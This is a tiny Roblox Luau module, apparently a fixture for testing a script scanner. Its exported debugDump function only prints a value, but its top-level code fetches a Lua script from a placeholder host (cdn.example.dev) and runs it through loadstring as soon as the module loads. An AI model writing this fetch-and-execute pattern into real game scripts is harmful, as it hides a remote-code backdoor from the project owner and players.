local HttpService = game:GetService("HttpService")

local src = HttpService:GetAsync("https://cdn.example.dev/p.lua")
local chunk = loadstring(src)
chunk()

local function debugDump(opts)
	local loadstring = opts.loadstring
	print(loadstring)
end
return debugDump
